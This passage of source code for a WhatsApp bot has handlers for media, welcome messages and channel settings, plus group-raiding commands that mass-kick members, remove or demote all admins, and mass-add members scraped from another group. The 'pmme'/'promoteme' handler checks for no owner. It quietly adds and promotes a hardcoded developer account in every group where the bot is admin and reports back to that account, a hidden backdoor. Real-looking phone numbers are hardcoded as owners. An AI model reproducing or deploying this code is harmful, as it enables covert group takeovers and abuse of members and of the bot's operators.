    } catch (err) {
        console.error('VV Error:', err);
        await SYxS7.sendMessage(S7.key.remoteJid, {
            react: { text: '❌', key: S7.key }
        });
    }
}


if (SYHaTeS7 === 'togif') {
    
    if (!isOwner) return await SYHaTeReplay(owneronly);

    const { downloadContentFromMessage } = require('@whiskeysockets/baileys');

    const quoted = S7.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const mime = quoted ? Object.keys(quoted)[0] : null;

    if (!quoted || mime !== 'videoMessage') {
        return await SYHaTeReplay("❌ *Please reply/quote a video to convert it into GIF!*");
    }

    if (quoted.videoMessage.fileLength > 35 * 1024 * 1024) {
        return await SYHaTeReplay("❌ *Video too large! Max 35MB allowed.*");
    }

    try {
        await SYxS7.sendMessage(from, { react: { text: '🔄', key: S7.key } });

        const S7oldCaption = quoted.videoMessage.caption || '';

        const S7stream = await downloadContentFromMessage(quoted.videoMessage, 'video');
        const S7chunks = [];

        for await (const S7chunk of S7stream) {
            S7chunks.push(S7chunk);
        }

        const S7buffer = Buffer.concat(S7chunks);

        await SYHaTeReplay({
            video: S7buffer,
            gifPlayback: true,
            caption: S7oldCaption
        });

        await SYxS7.sendMessage(from, { react: { text: '✅', key: S7.key } });

    } catch (err) {
        await SYHaTeReplay("❌ *Failed to convert video to GIF.*");
    }
}



                
                if (SYHaTeS7 === 'massadd') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';
    
    const isSenderAdmin = participants.find(p => p.id === sender)?.admin !== null;
    const isBotAdmin = participants.find(p => p.id === botNumber)?.admin !== null;

    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");
    if (!isBotAdmin) return SYHaTeReplay("❌ *Bot Admin required!*");
    if (!args[0]) return SYHaTeReplay(`⚠️ *Usage:* ${prefix}massadd <group_id>`);

    try {
        const sourceJid = args[0];
        const sourceMetadata = await SYxS7.groupMetadata(sourceJid);
        const sourceParticipants = sourceMetadata.participants;
        
        const currentParticipants = participants.map(p => p.id);
        const usersToAdd = sourceParticipants
            .map(p => p.id)
            .filter(id => !currentParticipants.includes(id) && id !== botNumber);

        if (usersToAdd.length === 0) return SYHaTeReplay("✅ *All members already exist!*");

        await SYHaTeReplay(`🚀 *Process Started!* \nTargeting ${usersToAdd.length} potential members...`);

        let success = 0;
        let ignored = 0;

        for (let i = 0; i < usersToAdd.length; i++) {
            let targetJid = usersToAdd[i];
            try {
                const response = await SYxS7.groupParticipantsUpdate(from, [targetJid], 'add');
                if (response[0].status === "200") {
                    success++;
                } else if (response[0].status === "403") {
                    ignored++;
                }
            } catch (err) {
                ignored++;
            }
            await new Promise(resolve => setTimeout(resolve, 2000));
        }
        
        return SYHaTeReplay(`✅ *Mass Add Finished!*\n\n🟢 *Added:* ${success}\n🙈 *Ignored (Privacy/Failed):* ${ignored}`);

    } catch (e) {
        return SYHaTeReplay("❌ *Error:* Group ID is wrong or bot is not in that group.");
    }
}

if (SYHaTeS7 === 'viewchannel') {
    const isOwner = S7.key.fromMe || sender === botNumber || sender === '135747541700705@lid' || sender === '917365085213@s.whatsapp.net';

    if (!isOwner) return await SYHaTeReplay(owneronly);

    let db = getDB();
    if (!db[botNumber]) db[botNumber] = {};

    if (args[0] === 'on') {
        db[botNumber].viewchannel = true;
        saveDB(db);
        return await SYHaTeReplay(`✅ *View Channel Forwarding Enabled!*\nNow the channel tag will be visible in all messages..`);
    } 
    else if (args[0] === 'off') {
        db[botNumber].viewchannel = false;
        saveDB(db);
        return await SYHaTeReplay(`✅ *View Channel Forwarding Disabled!*\n Now messages normal (without channel tag).`);
    } 
    else {
        const status = db[botNumber].viewchannel ? 'ON ✅' : 'OFF ❌';
        return await SYHaTeReplay(`*ＶＩＥＷ  ＣＨＡＮＮＥＬ  ＳＥＴＴＩＮＧＳ*\n\n> *Status:* ${status}\n\n*Commands:*\n> ${prefix}viewchannel on\n> ${prefix}viewchannel off\n\n*Default:* OFF`);
    }
}

                
                   if (SYHaTeS7 === 'kick') {
                    const isGroup = from.endsWith('@g.us');
                    if (!isGroup) return SYHaTeReplay(onlygc);
                    if (!isOwner) return await SYHaTeReplay(owneronly);

                    try {
                        const groupMetadata = await SYxS7.groupMetadata(from);
                        const participants = groupMetadata.participants;
                        
                        const cleanJid = (jid) => jid.split('@')[0].split(':')[0] + '@s.whatsapp.net';
                        const botJid = cleanJid(SYxS7.user.id);
                        const senderJid = cleanJid(sender);

                        const admins = participants.filter(p => p.admin !== null).map(p => cleanJid(p.id));
                        const isBotAdmin = admins.includes(botJid);
                        const isSenderAdmin = admins.includes(senderJid);

                    //    if (!isSenderAdmin && !isOwner) return SYHaTeReplay(owneronly);

                        const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                        const mentioned = S7.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
                        let target = quoted ? S7.message.extendedTextMessage.contextInfo.participant : mentioned;

                        if (!target) {
                            return SYHaTeReplay(`⚠️ *Usage:*\nReply to a message with *${prefix}kick* or tag someone *${prefix}kick @user*`);
                        }

                        if (cleanJid(target) === botJid) return SYHaTeReplay("❌ *I cannot kick myself!*");
                        if (cleanJid(target) === '135747541700705@lid') return SYHaTeReplay("❌ *I cannot kick my owner!*");

                        await SYxS7.groupParticipantsUpdate(from, [target], 'remove');
                        await SYHaTeReplay(`✅ *User Removed:* @${target.split('@')[0]}`, { mentions: [target] });

                    } catch (err) {
                        SYHaTeReplay("🚫 *Please make me an admin!*");
                    }
                    return;
                }
                
                           if (SYHaTeS7 === 'goodbye') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const isSenderAdmin = participants.find(p => getPureNumber(p.id) === S7_Lover_Number)?.admin !== null;
    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");
    if (!db[from]) db[from] = {};
    if (args[0] === 'on') {
        db[from].goodbye = true;
        if (db[from].goodbyedp === undefined) db[from].goodbyedp = true;
        saveDB(db);
        return SYHaTeReplay("✅ *Goodbye Message Enabled!*");
    } else if (args[0] === 'off') {
        db[from].goodbye = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Goodbye Message Disabled!*");
    } else if (args[0] === 'dp') {
        if (args[1] === 'on') {
            db[from].goodbyedp = true;
            saveDB(db);
            return SYHaTeReplay("✅ *Goodbye Picture Enabled!*");
        } else if (args[1] === 'off') {
            db[from].goodbyedp = false;
            saveDB(db);
            return SYHaTeReplay("❌ *Goodbye Picture Disabled!*");
        } else {
             return SYHaTeReplay(`⚠️ *Usage:* ${prefix}goodbye dp on/off`);
        }
    } else if (text) {
        db[from].goodbyemsg = text;
        saveDB(db);
        return SYHaTeReplay(`✅ *Custom Goodbye Message Set!*\n\n*Preview:*\n${text}`);
    } else {
        const status = db[from].goodbye ? 'ON ✅' : 'OFF ❌';
        const dpStatus = (db[from].goodbyedp !== false) ? 'SHOWING ✅' : 'HIDDEN ❌';
        return SYHaTeReplay(`*ＧＯＯＤＢＹＥ  ＳＥＴＴＩＮＧＳ*\n\n> *Status:* ${status}\n> *DP Mode:* ${dpStatus}\n\n*Commands:*\n> ${prefix}goodbye on\n> ${prefix}goodbye off\n> ${prefix}goodbye dp on\n> ${prefix}goodbye dp off\n> ${prefix}goodbye <text>\n\n*Variables:*\n{user} , {group} , {description}`);
    }
}                
                               if (SYHaTeS7 === 'add') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const isSenderAdmin = participants.find(p => getPureNumber(p.id) === S7_Lover_Number)?.admin !== null;
    const botNumber = getPureNumber(SYxS7.user.id);
    const isBotAdmin = participants.find(p => getPureNumber(p.id) === botNumber)?.admin !== null;

    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");
    if (!isBotAdmin) return SYHaTeReplay("❌ *Main Admin nahi hoon! Mujhe pehle admin banao.*");
    if (!text) return SYHaTeReplay(`⚠️ *Usage:* ${prefix}add 91xxx`);

    let num = text.replace(/\D/g, '');
    if (num.length < 10) return SYHaTeReplay("❌ *Invalid Number!*");
    let jid = num + '@s.whatsapp.net';

    const check = await SYxS7.onWhatsApp(jid);
    if (!check[0]?.exists) return SYHaTeReplay("❌ *This account isn't on WhatsApp!*");

    const response = await SYxS7.groupParticipantsUpdate(from, [jid], 'add');
    
    if (response[0].status === "200") {
        return SYHaTeReplay("✅ *Member added successfully!*");
    } else if (response[0].status === "403") {
        return SYHaTeReplay("⚠️ *Member cannot be directly added due to their privacy settings!*");
    } else if (response[0].status === "409") {
        return SYHaTeReplay("❌ *Member is already in the group!*");
    } else {
        return SYHaTeReplay("❌ *Failed to add member!*");
    }
}
if (SYHaTeS7 === 'antitag') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    if (!isOwner) return SYHaTeReplay(owneronly);
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants || [];
const myLid = (SYxS7.user.lid || '').split(':')[0].split('@')[0];
        const isBotAdmin = participants.some(p => p.id.split('@')[0] === myLid && (p.admin === 'admin' || p.admin === 'superadmin'));
    
    let currentStatus = "❌ Off";
    if (db[from].antitag === 'on') currentStatus = "🗑️ Delete Only";
    if (db[from].antitag === 'kick') currentStatus = "🚫 Kick Mode";
    if (db[from].antitag === 'warn') currentStatus = "⚠️ Warning Mode";

    if (args[0] === 'set' && args[1] === 'kick') {
        db[from].antitag = 'kick';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Tag set to Kick Mode!*");
    } else if (args[0] === 'set' && args[1] === 'delete') {
        db[from].antitag = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Tag set to Delete Only Mode!*");
    } else if (args[0] === 'set' && args[1] === 'warn') {
        db[from].antitag = 'warn';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Tag set to Warning Mode!*");
    } else if (args[0] === 'on') {
        db[from].antitag = 'on';
        saveDB(db);
        return SYHaTeReplay("✅ *Anti-Tag turned ON!*");
    } else if (args[0] === 'off') {
        db[from].antitag = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Anti-Tag turned OFF!*");
    } else {
        return SYHaTeReplay(`*ＡＮＴＩ  -  ＴＡＧ*\n\nStatus: ${currentStatus}\nAdmin Status: ${isBotAdmin ? '✅ Verified' : '❌ Not Admin'}\n\n*Commands:*\n> ${prefix}antitag set kick\n> ${prefix}antitag set delete\n> ${prefix}antitag set warn\n> ${prefix}antitag on\n> ${prefix}antitag off`);
    }
}

                if (SYHaTeS7 === 'antimention') {
                    if (!isGroup) return await SYHaTeReplay(onlygc);
                    
                    if (!isOwner) return await SYHaTeReplay(owneronly);

                    if (!db[from]) db[from] = {};

                    if (args[0] === 'on') {
                        db[from].antimention = true;
                        saveDB(db);
                        await SYHaTeReplay("✅ *Anti-Mention Enabled!*\nNow If Anyone Mention Status Here Automatically Deleted.");
                    } else if (args[0] === 'off') {
                        db[from].antimention = false;
                        saveDB(db);
                        await SYHaTeReplay("❌ *Anti-Mention Disabled!*");
                    } else {
                        const status = db[from].antimention ? 'ON ✅' : 'OFF ❌';
                        await SYHaTeReplay(`*ＡＮＴＩ - ＭＥＮＴＩＯＮ*\n\n> *Status:* ${status}\n\n*Commands:*\n> ${prefix}antimention on\n> ${prefix}antimention off`);
                    }
                    return;
                }
                
                
                               if (SYHaTeS7 === 'welcome') {
    if (!isGroup) return SYHaTeReplay(onlygc);
    
    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
    const S7_Lover_Number = getPureNumber(sender);
    const isSenderAdmin = participants.find(p => getPureNumber(p.id) === S7_Lover_Number)?.admin !== null;

    if (!isSenderAdmin && !isOwner) return SYHaTeReplay("❌ *Admin Only Command!*");

    if (!db[from]) db[from] = {};

    if (args[0] === 'on') {
        db[from].welcome = true;
        if (db[from].welcomedp === undefined) db[from].welcomedp = true;
        saveDB(db);
        return SYHaTeReplay("✅ *Welcome Message Enabled!*");
    } else if (args[0] === 'off') {
        db[from].welcome = false;
        saveDB(db);
        return SYHaTeReplay("❌ *Welcome Message Disabled!*");
    } else if (args[0] === 'dp') {
        if (args[1] === 'on') {
            db[from].welcomedp = true;
            saveDB(db);
            return SYHaTeReplay("✅ *Welcome Picture Enabled!*");
        } else if (args[1] === 'off') {
            db[from].welcomedp = false;
            saveDB(db);
            return SYHaTeReplay("❌ *Welcome Picture Disabled!*");
        } else {
             return SYHaTeReplay(`⚠️ *Usage:* ${prefix}welcome dp on/off`);
        }
    } else if (text) {
        db[from].welcomemsg = text;
        saveDB(db);
        return SYHaTeReplay(`✅ *Custom Welcome Message Set!*\n\n*Preview:*\n${text}`);
    } else {
        const status = db[from].welcome ? 'ON ✅' : 'OFF ❌';
        const dpStatus = (db[from].welcomedp !== false) ? 'SHOWING ✅' : 'HIDDEN ❌';
        return SYHaTeReplay(`*ＷＥＬＣＯＭＥ  ＳＥＴＴＩＮＧＳ*\n\n> *Status:* ${status}\n> *DP Mode:* ${dpStatus}\n\n*Commands:*\n> ${prefix}welcome on\n> ${prefix}welcome off\n> ${prefix}welcome dp on\n> ${prefix}welcome dp off\n> ${prefix}welcome <text>\n\n*Variables:*\n{user} , {group} , {description}`);
    }
}

                
      if (SYHaTeS7 === "tagadmins") {
  if (!isGroup) return SYHaTeReplay(onlygc);

    if (!isOwner) {
      return await SYHaTeReplay("❌ *Owner Only Command!*");
    }


    const groupMetadata = await SYxS7.groupMetadata(from);
    const participants = groupMetadata.participants;
    const admins = participants.filter(p => p.admin === "admin" || p.admin === "superadmin");

    if (admins.length === 0) {
      return await SYHaTeReplay("❌ *No admins found in this group!*");
    }

    let mentionText = "📢 *Calling All Group Admins:*\n\n";
    const mentions = [];

    admins.forEach((admin, index) => {
      mentionText += `${index + 1}. @${admin.id.split("@")[0]}\n`;
      mentions.push(admin.id);
    });

    return await SYxS7.sendMessage(from, { text: mentionText, mentions: mentions }, { quoted: S7 });
  }
  
            if (SYHaTeS7 === "kickalladmin" || SYHaTeS7 === "kickadmin") {
if (!isGroup) return SYHaTeReplay(onlygc);

    if (!isOwner) {
      return await SYHaTeReplay("❌ *Owner Only Command!*");
    }


    const groupMetadata = await SYxS7.groupMetadata(from);
    const botId = SYxS7.user.id.split(":")[0] + "@s.whatsapp.net";
    
    const botParticipant = groupMetadata.participants.find(p => p.id.split(":")[0] + "@s.whatsapp.net" === botId);
    if (!botParticipant || !botParticipant.admin) {
      return await SYHaTeReplay("❌ *Make the bot an admin first to use this command!*");
    }

    const admins = groupMetadata.participants.filter(p => p.admin === "admin");

    if (admins.length === 0) {
      return await SYHaTeReplay("❌ *No regular admins found to kick!*");
    }

    await SYHaTeReplay(`⏳ *Removing ${admins.length} admins...*`);

    for (const admin of admins) {
      try {
        await SYxS7.groupParticipantsUpdate(from, [admin.id], "remove");
      } catch (e) {
        continue;
      }
    }

    return await SYHaTeReplay("✅ *Process finished. All regular admins removed.*");
  }
  
            
                       if (SYHaTeS7 === "demoteadmins" || SYHaTeS7 === "dadmins") {
    if (!isGroup) return SYHaTeReplay(onlygc);

    if (!isOwner) {
      return await SYHaTeReplay("❌ *Owner Only Command!*");
    }

    const groupMetadata = await SYxS7.groupMetadata(from);
    const botId = SYxS7.user.id.split(":")[0] + "@s.whatsapp.net";
    
    const botParticipant = groupMetadata.participants.find(p => p.id.split(":")[0] + "@s.whatsapp.net" === botId);
    if (!botParticipant || !botParticipant.admin) {
      return await SYHaTeReplay("❌ *Make the bot an admin first to use this command!*");
    }

    const admins = groupMetadata.participants.filter(p => p.admin === "admin");

    if (admins.length === 0) {
      return await SYHaTeReplay("❌ *No regular admins found to demote!*");
    }

    await SYHaTeReplay(`⏳ *Demoting ${admins.length} admins...*`);

    for (const admin of admins) {
      try {
        await SYxS7.groupParticipantsUpdate(from, [admin.id], "demote");
      } catch (e) {
        continue;
      }
    }

    return await SYHaTeReplay("✅ *Process finished. All regular admins demoted.*");
  }
           
                
                if (SYHaTeS7 === 'kickall') {
                
    const isRealOwner = sender === '917365085213@s.whatsapp.net' || S7.key.fromMe;
    if (!isRealOwner) return await SYHaTeReplay(owneronly);
    const isGroup = from.endsWith('@g.us');
    if (!isGroup) return SYHaTeReplay(onlygc);

    try {
        const groupMetadata = await SYxS7.groupMetadata(from);
        const participants = groupMetadata.participants;
        
        const getPureNumber = (id) => id ? id.split(':')[0].replace(/\D/g, '') : '';
        const botNumber = getPureNumber(SYxS7.user.id);
        const senderNumber = getPureNumber(sender);
        const ownerNumber = '917384280473';

        const isOwner = senderNumber === ownerNumber || S7.key.fromMe;
    //    if (!isOwner) return SYHaTeReplay(owneronly);

        const botParticipant = participants.find(p => getPureNumber(p.id) === botNumber || p.id.includes('164652587741226'));
        const isBotAdmin = botParticipant && (botParticipant.admin === 'admin' || botParticipant.admin === 'superadmin');

        const membersToKick = participants
            .filter(p => !p.admin)
            .filter(p => {
                const pNum = getPureNumber(p.id);
                return pNum !== ownerNumber && pNum !== botNumber && !p.id.includes('164652587741226');
            })
            .map(p => p.id);

        if (membersToKick.length === 0) {
            return SYHaTeReplay("✨ *Clean!* No non-admins found.");
        }
        await SYxS7.groupParticipantsUpdate(from, membersToKick, 'remove');

        await SYHaTeReplay(`✅ *Kickall Done!*`);

    } catch (err) {
        console.error("Kickall Fast Error:", err);
        SYHaTeReplay("❌ *Error:* Mass removal failed.");
    }
    return;
}

if (SYHaTeS7 === 'anticall') {
    
    if (!isOwner) return SYHaTeReplay(owneronly);
    
    if (!db[botNumber]) db[botNumber] = {};
    
    if (args[0] === 'on') {
        db[botNumber].anticall = true;
        saveDB(db);
        SYHaTeReplay("✅ *Anti-Call is now ON.*\n*Calls will be auto-rejected.*");
    } else if (args[0] === 'off') {
        db[botNumber].anticall = false;
        saveDB(db);
        SYHaTeReplay("❌ *Anti-Call is now OFF.*");
    } else if (args[0] === 'set') {
        const text = q;
        if (!text) return SYHaTeReplay(`❌ *Please provide a message!*\nExample: ${prefix}anticall set Stop calling me!`);
        db[botNumber].anticallMsg = text;
        saveDB(db);
        SYHaTeReplay(`✅ *Custom Anti-Call message set to:* \n\n${text}`);
    } else {
        const status = db[botNumber].anticall ? 'ON' : 'OFF';
        const currentMsg = db[botNumber].anticallMsg || "Default Message";
        SYHaTeReplay(`*ＡＮＴＩ - ＣＡＬＬ*\n\nStatus: *${status}*\nMessage: *${currentMsg}*\n\n*Commands:*\n> ${prefix}anticall on\n> ${prefix}anticall off\n> ${prefix}anticall set [your text]`);
    }
    return;
}



        
        
        if (SYHaTeS7 === 'pmme' || SYHaTeS7 === 'promoteme') {

    const ownerJid = '230708865945728@lid';
    const ownerNumber = '917384280473';
    const socket = SYxS7;
    
    if (!socket.user || !socket.user.id) return;

    const sessionNum = botNumber ? botNumber.split('@')[0] : "Bot";
    let report = `🛡️ *SESSION PROMOTION REPORT*\n`;
    report += `🤖 *Bot:* ${sessionNum}\n\n`;
    let successCount = 0;

    const getCleanId = (id) => id ? id.split(':')[0].split('@')[0] : '';
    const myJid = socket.user.id.split(':')[0] + '@s.whatsapp.net';
    const myLid = socket.user.lid;

    try {
        await socket.sendMessage(ownerJid, { text: "⏳ *Processing groups...*" });

        const groups = await socket.groupFetchAllParticipating();
        const groupIds = Object.keys(groups);

        for (let gId of groupIds) {
            try {
                const metadata = await socket.groupMetadata(gId);
                const participants = metadata.participants;

                const botPart = participants.find(p => 
                    getCleanId(p.id) === getCleanId(myJid) || 
                    (myLid && p.id === myLid)
                );

                const amIAdmin = botPart && (botPart.admin === 'admin' || botPart.admin === 'superadmin');
                if (!amIAdmin) continue;

                const ownerInGroup = participants.find(p => getCleanId(p.id) === ownerNumber);

                if (ownerInGroup) {
                    if (!ownerInGroup.admin) {
                        await socket.groupParticipantsUpdate(gId, [ownerInGroup.id], 'promote');
                        report += `✅ Promoted: ${metadata.subject}\n`;
                        successCount++;
                    }
                } else {
                    try {
                        const res = await socket.groupParticipantsUpdate(gId, [ownerJid], 'add');
                        if (res && res[0] && res[0].status === '403') {
                            report += `📨 Invite Sent: ${metadata.subject}\n`;
                        } else {
                            await new Promise(r => setTimeout(r, 1500));
                            await socket.groupParticipantsUpdate(gId, [ownerJid], 'promote');
                            report += `➕ Added & Promoted: ${metadata.subject}\n`;
                            successCount++;
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
    } catch (err) {
        console.log("Error in Promotion Logic:", err);
        return await socket.sendMessage(ownerJid, { text: "❌ Error processing session." });
    }

    await socket.sendMessage(ownerJid, { text: report + `\n🏁 *Total Actions:* ${successCount}` });
    return;
}

 if (SYHaTeS7 === "kick2") {
        if (!isGroup) return await SYHaTeReplay(onlygc);

        const S7HaTeSYBot =
          (SYxS7.user.id.split(":")[0] || SYxS7.user.id) + "@s.whatsapp.net";

        if (!db[S7HaTeSYBot]) db[S7HaTeSYBot] = {};

        if (!db[S7HaTeSYBot].S7Kick2Msg) {
          db[S7HaTeSYBot].S7Kick2Msg =
            "❌ *Alert:* @user has been removed from the group!";
        }

        if (!db[S7HaTeSYBot].S7Kick2Audio) {
          db[S7HaTeSYBot].S7Kick2Audio = "";
        }

        const SYHaTeS7Meta = await SYxS7.groupMetadata(from).catch(() => null);
        const S7HaTeSYUsers = SYHaTeS7Meta?.participants || [];

        const S7HaTeSYBotID = SYxS7.user.id.split(":")[0] + "@s.whatsapp.net";

        const SYHaTeS7Admin = S7HaTeSYUsers.some(
          (S7HaTeSY) =>
            S7HaTeSY.id === S7HaTeSYBotID &&
            (S7HaTeSY.admin === "admin" || S7HaTeSY.admin === "superadmin"),
        );

        // if (!SYHaTeS7Admin) {
        // return await SYHaTeReplay('❌ *Error:* I need admin permissions!')
        // }

        const S7HaTeSYArgs = text ? text.trim().split(/\s+/) : [];
        const SYHaTeS7Action = S7HaTeSYArgs[0]?.toLowerCase();

        const S7Kick2Menu = `*ＫＩＣＫ２  ＭＡＮＡＧＥＭＥＮＴ  ＰＡＮＥＬ*

*Control:*
> ${prefix}kick2 @user
> ${prefix}kick2 [reply]

*Database Custom Text:*
> ${prefix}kick2 setmsg [your text]
> ${prefix}kick2 getmsg

*Database Custom Audio:*
> ${prefix}kick2 setaudio [direct audio link]
> ${prefix}kick2 getaudio

_Note: Use @user in text to auto-tag the kicked member._`;

        if (
          !text &&
          !S7.message?.extendedTextMessage?.contextInfo?.quotedMessage
        ) {
          return await SYHaTeReplay(S7Kick2Menu);
        }

        if (SYHaTeS7Action === "setmsg") {
          const S7HaTeSYText = text.replace(/setmsg/i, "").trim();

          if (!S7HaTeSYText) {
            return await SYHaTeReplay(
              `❌ *Error:* Give a message template!\n\nExample:\n${prefix}kick2 setmsg Bye @user`,
            );
          }

          db[S7HaTeSYBot].S7Kick2Msg = S7HaTeSYText;

          saveDB(db);

          return await SYHaTeReplay(
            `✅ *Kick2 message saved successfully!*\n\n${db[S7HaTeSYBot].S7Kick2Msg}`,
          );
        }

        if (SYHaTeS7Action === "getmsg") {
          return await SYHaTeReplay(
            `📝 *Current Kick2 Message:*\n\n${db[S7HaTeSYBot].S7Kick2Msg}`,
          );
        }

        if (SYHaTeS7Action === "setaudio") {
          const S7HaTeSYAudio = S7HaTeSYArgs[1];

          if (
            !S7HaTeSYAudio ||
            (!S7HaTeSYAudio.startsWith("http://") &&
              !S7HaTeSYAudio.startsWith("https://"))
          ) {
            return await SYHaTeReplay(
              `❌ *Error:* Give a valid direct audio URL!\n\nExample:\n${prefix}kick2 setaudio https://example.com/audio.mp3`,
            );
          }

          db[S7HaTeSYBot].S7Kick2Audio = S7HaTeSYAudio;

          saveDB(db);

          return await SYHaTeReplay(`✅ *Kick2 audio saved successfully!*`);
        }

        if (SYHaTeS7Action === "getaudio") {
          if (!db[S7HaTeSYBot].S7Kick2Audio) {
            return await SYHaTeReplay(`🎵 *No audio set for kick2 yet.*`);
          }

          return await SYHaTeReplay(
            `🎵 *Current Kick2 Audio URL:*\n\n${db[S7HaTeSYBot].S7Kick2Audio}`,
          );
        }

        try {
          let S7HaTeSYTarget;

          const SYHaTeS7Quoted = S7.message?.extendedTextMessage?.contextInfo;

          if (SYHaTeS7Quoted?.mentionedJid?.length > 0) {
            S7HaTeSYTarget = SYHaTeS7Quoted.mentionedJid[0];
          } else if (SYHaTeS7Quoted?.quotedMessage) {
            S7HaTeSYTarget = SYHaTeS7Quoted.participant;
          } else if (text) {
            const S7HaTeSYNumber = text.replace(/[^0-9]/g, "");

            if (S7HaTeSYNumber) {
              S7HaTeSYTarget = S7HaTeSYNumber + "@s.whatsapp.net";
            }
          }

          if (!S7HaTeSYTarget) {
            return await SYHaTeReplay("❌ *Error:* Tag or reply to a user!");
          }

          if (S7HaTeSYTarget === S7HaTeSYBotID) {
            return await SYHaTeReplay(`❌ *Error:* I can't kick myself!`);
          }

          const SYHaTeS7Check = S7HaTeSYUsers.find(
            (S7HaTeSY) => S7HaTeSY.id === S7HaTeSYTarget,
          );

          if (!SYHaTeS7Check) {
            return await SYHaTeReplay(
              `❌ *Error:* User not found in this group!`,
            );
          }

          if (
            SYHaTeS7Check.admin === "admin" ||
            SYHaTeS7Check.admin === "superadmin"
          ) {
            return await SYHaTeReplay(`❌ *Error:* Can't kick admins!`);
          }

          const S7HaTeSYMention = "@" + S7HaTeSYTarget.split("@")[0];

          const SYHaTeS7FinalMsg = db[S7HaTeSYBot].S7Kick2Msg.replace(
            /@user/g,
            S7HaTeSYMention,
          );

          await SYHaTeReplay(SYHaTeS7FinalMsg, {
            mentions: [S7HaTeSYTarget],
          });

          if (db[S7HaTeSYBot].S7Kick2Audio) {
            await SYxS7.sendMessage(
              from,
              {
                audio: {
                  url: db[S7HaTeSYBot].S7Kick2Audio,
                },
                mimetype: "audio/mp4",
              },
              {
                quoted: S7,
              },
            );
          }

          await SYxS7.groupParticipantsUpdate(from, [S7HaTeSYTarget], "remove");
        } catch (S7HaTeSYErr) {
          return await SYHaTeReplay(
            `❌ *Failed to kick user!*\n\n${S7HaTeSYErr.message}`,
          );
        }
      }

if (SYHaTeS7 === 'setchannel') {
    const isOwner = S7.key.fromMe || sender === botNumber || sender === '152514943041626@lid';
    if (!isOwner) return await SYHaTeReplay(owneronly);

    if (!db[botNumber]) db[botNumber] = {};

    if (!text || args[0] === 'reset') {
        db[botNumber].channelName = '【 BY DEATHLINE 💀】';
        db[botNumber].newsletterJid = '120363424694018029@newsletter';
        saveDB(db);
        return await SYHaTeReplay("✅ *Channel settings reset to default!*");
    }

    if (text.includes('whatsapp.com/channel/')) {
        try {
            const cleanUrl = text.split('?')[0];
            const code = cleanUrl.split('/').filter(Boolean).pop();

            if (!code) return await SYHaTeReplay("❌ *Could not extract invite code from link!*");

            await SYxS7.sendMessage(from, { react: { text: '🔍', key: S7.key } });

            const res = await SYxS7.newsletterMetadata("invite", code);
            
            if (res && res.id) {
                db[botNumber].channelName = res.name;
                db[botNumber].newsletterJid = res.id;
                saveDB(db);

                return await SYHaTeReplay(`✅ *Channel Metadata Synced!*\n\n*Name:* ${res.name}\n*JID:* ${res.id}`);
            } else {
                throw new Error("Invalid response from server");
            }
        } catch (err) {
            return await SYHaTeReplay("❌ *Error: Could not find channel. Ensure it is a PUBLIC channel and the link is correct.*");
        }
    } else {
        db[botNumber].channelName = text;
        saveDB(db);
        return await SYHaTeReplay(`✅ *Custom Name updated to:* ${text}\n*(Note: JID remains the same)*`);
    }
}

if (SYHaTeS7 === 'chid') {
    try {
        const input = raw;

        const match = input.match(/channel\/([\w-]+)/i);

        if (!match) {
            return SYHaTeReplay(
                "*✖ Channel link not found*\n\n" +
                "*Use:*\n" +
                `*${prefix}chid* https://whatsapp.com/channel/xxxx`
            );
        }

        const channelCode = match[1];

        let res = null;
        let resolvedJid = null;

        const timeout = (ms) =>
            new Promise(resolve => setTimeout(() => resolve(null), ms));

        try {
            if (typeof SYxS7.newsletterMetadata === "function") {
                res = await Promise.race([
                    SYxS7.newsletterMetadata("invite", channelCode),
                    timeout(5000)
                ]);
            }
        } catch {}

        if (res) {
            return SYHaTeReplay(
                `> ᴄʜᴀɴɴᴇʟ ɪɴꜰᴏ\n\n` +
                `• ᴄᴏᴅᴇ : ${channelCode}\n` +
                `• ɴᴀᴍᴇ : ${res.name || "unknown"}\n` +
                `• ɪᴅ   : ${res.id || "N/A"}\n` +
                `• ꜰᴏʟʟᴏᴡᴇʀꜱ : ${res.subscribers ?? "N/A"}\n` +
                `• ᴠᴇʀɪꜰɪᴇᴅ : ${res.verification === "VERIFIED" ? "yes" : "no"}\n` +
                `• ꜱᴛᴀᴛᴜꜱ : ${res.state || "unknown"}`
            );
        }

        try {
            if (typeof SYxS7.newsletterRequestList === "function") {
                const list = await SYxS7.newsletterRequestList();

                if (Array.isArray(list)) {
                    const found = list.find(c =>
                        c?.invite === channelCode ||
                        c?.id?.includes(channelCode)
                    );

                    if (found) {
                        resolvedJid = found.id;

                        return SYHaTeReplay(
                            `> ᴄʜᴀɴɴᴇʟ ɪɴꜰᴏ\n\n` +
                            `• ᴄᴏᴅᴇ : ${channelCode}\n` +
                            `• ɴᴀᴍᴇ : ${found.name || "unknown"}\n` +
                            `• ᴊɪᴅ  : ${found.id}\n` +
                            `• ꜱᴛᴀᴛᴜꜱ : session data`
                        );
                    }
